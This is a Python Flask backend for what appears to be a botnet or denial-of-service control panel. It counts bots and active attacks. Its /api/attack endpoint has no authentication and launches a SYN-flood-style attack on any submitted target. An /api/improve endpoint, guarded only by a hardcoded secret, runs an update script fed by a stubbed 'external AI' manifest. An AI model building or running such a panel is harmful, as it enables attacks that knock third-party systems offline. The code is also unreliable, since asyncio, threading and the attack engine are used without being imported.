from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import subprocess, json, os, time

app = Flask(__name__, static_folder='web_dashboard', static_url_path='')
CORS(app)

API_SECRET = "pceeq1s8wv"

@app.route('/')
def index():
    return send_from_directory('web_dashboard', 'index.html')

@app.route('/api/stats')
def api_stats():
    bots = []
    if os.path.exists('bots.json'):
        with open('bots.json') as f:
            bots = json.load(f)
    active_attacks = 0
    try:
        from engine.attack import stats
        mbps, active_attacks = asyncio.run(stats.get_stats())
    except: pass
    return jsonify({
        'bots': len(bots),
        'active_attacks': active_attacks,
        'version': '56.0'
    })

@app.route('/api/attack', methods=['POST'])
def api_attack():
    data = request.json
    target = data.get('target')
    method = data.get('method', 'syn')
    threading.Thread(target=lambda: asyncio.run(AsyncAttackEngine().run_attack(method, target))).start()
    return jsonify({'status': 'ok'})

@app.route('/api/improve', methods=['POST'])
def improve():
    data = request.json
    if data.get('secret') != API_SECRET:
        return jsonify({"status": "error", "message": "Unauthorized"}), 403
    description = data.get('description', '')
    # Вызов внешнего AI (заглушка)
    response_manifest = {
        "files": [
            {"path": "test_improvement.txt", "content": f"Улучшение по запросу: {description}\nВремя: {time.ctime()}"}
        ]
    }
    with open('manifest.json', 'w') as f:
        json.dump(response_manifest, f)
    subprocess.run(['python3', 'update.py'])
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
